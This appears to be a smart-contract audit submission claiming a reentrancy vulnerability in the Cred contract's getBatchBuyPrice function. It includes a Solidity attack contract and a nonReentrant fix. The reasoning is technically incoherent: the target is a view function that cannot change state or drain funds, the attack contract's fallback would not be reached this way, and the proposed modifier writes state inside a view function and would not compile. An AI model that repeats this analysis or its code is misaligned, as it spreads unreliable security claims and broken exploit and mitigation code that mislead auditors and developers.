# Vulnerability details

## Impact
Detailed description of the impact of this finding.

Title: Cred contract has Multiple Calls in a Single Transaction for getBatchBuyPrice function.
Contract: Cred
Function Name: getBatchBuyPrice(uint256[] credIds_, uint256[] amounts_)
PC Address: 8117
Estimated Gas Usage: 8398 - 79888
Severity Level: Medium
Issue Type: Reentrancy/External Call Risk

The function getBatchBuyPrice in the Cred contract makes multiple external calls within a single transaction. Specifically, it loops over a list of credIds_ and calls the getBuyPriceAfterFee function from the external IBondingCurve contract for each item.

A malicious or compromised IBondingCurve contract could cause the entire getBatchBuyPrice function to revert, preventing users from interacting with the Cred contract as expected. This could result in a denial of service for users and potentially lead to unexpected behaviour, loss of gas fees, or other critical issues.

## Proof of Concept
Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.

Multiple calls are executed in the same transaction.
This call is executed following another call within the same transaction. It is possible that the call never gets executed if a prior call fails permanently. This might be caused intentionally by a malicious callee. If possible, refactor the code such that each transaction only executes one external call or make sure that all callees can be trusted (i.e. they’re part of your own codebase).

If any of the external calls to getBuyPriceAfterFee fails, the entire transaction will revert.

An attacker could deploy a malicious contract that exploits this vulnerability by re-entering the getBatchBuyPrice function during its execution:
```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import { Cred } from "2024-08-phi/src/Cred.sol";

interface ICred {
    function getBatchBuyPrice(uint256[] calldata credIds_, uint256[] calldata amounts_) external view returns (uint256);
}

contract ReentrancyAttack {
    ICred public vulnerableContract;
    uint256[] public credIds;
    uint256[] public amounts;
    bool public attackInProgress;

    constructor(address _vulnerableContract, uint256[] memory _credIds, uint256[] memory _amounts) {
        vulnerableContract = ICred(_vulnerableContract);
        credIds = _credIds;
        amounts = _amounts;
    }

    // Fallback function to re-enter the contract
    fallback() external payable {
        if (!attackInProgress) {
            attackInProgress = true;
            // Re-enter the vulnerable function
            vulnerableContract.getBatchBuyPrice(credIds, amounts);
        }
    }

    // Initiate the attack
    function attack() public {
        attackInProgress = false;
        vulnerableContract.getBatchBuyPrice(credIds, amounts);
    }
}
```

Attack Explanation

1. Setup: 
The attacker deploys the ReentrancyAttack contract and initializes it with the address of the vulnerable Cred contract, along with the credIds and amounts they intend to use for the attack.

2. Attack Initiation: 
The attacker calls the attack() function on their contract, which in turn calls getBatchBuyPrice on the Cred contract.
	
3. Reentrancy Exploitation: 
When the getBatchBuyPrice function calls into the external IBondingCurve contract, the IBondingCurve contract’s fallback function is triggered. The IBondingCurve contract can call back into the Cred contract, specifically into getBatchBuyPrice, before the first execution completes. This can cause unexpected behaviour, such as incorrect state updates or draining funds if the contract handles funds.
	
4. Result: 
The reentrancy can cause the vulnerable contract to process the same inputs multiple times, leading to inconsistent state, incorrect calculations, or even financial losses, depending on what the contract is doing.

## Recommended Mitigation Steps

To mitigate this, ensure the Cred contract uses a nonReentrant modifier or similar mechanism to prevent reentrancy:
```sol
modifier nonReentrant() {
    require(!_entered, "Reentrant call");
    _entered = true;
    _;
    _entered = false;
}

bool private _entered;

function getBatchBuyPrice(
    uint256[] calldata credIds_,
    uint256[] calldata amounts_
) 
    external 
    view 
    nonReentrant 
    returns (uint256) 
{
    uint256 total;
    for (uint256 i = 0; i < credIds_.length; ++i) {
        total += IBondingCurve(creds[credIds_[i]].bondingCurve)
            .getBuyPriceAfterFee(credIds_[i], creds[credIds_[i]].currentSupply, amounts_[i]);
    }
    return total;
}
```
By adding a nonReentrant modifier or other reentrancy guard mechanisms, such attacks can be prevented, securing the contract against these types of vulnerabilities.
